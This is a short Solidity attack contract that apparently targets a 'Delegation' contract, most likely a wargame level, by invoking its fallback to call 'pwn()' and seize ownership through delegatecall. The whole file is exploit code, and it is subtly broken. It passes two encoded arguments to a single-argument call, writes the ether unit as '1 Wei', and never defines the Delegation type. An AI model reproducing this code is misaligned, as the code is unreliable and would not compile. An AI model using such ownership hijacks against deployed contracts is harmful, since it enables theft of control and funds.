// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract DelegationAttack {

    Delegation public delegation;

    constructor(address _delegationAddress) {
        delegation = Delegation(_delegationAddress);
    }



    function attack () public returns (bool) {
        (bool success,)=address(delegation).call{value:1 Wei}(abi.encodeWithSignature("fallback()"),abi.encodeWithSignature("pwn()"));
        return success;
    }



}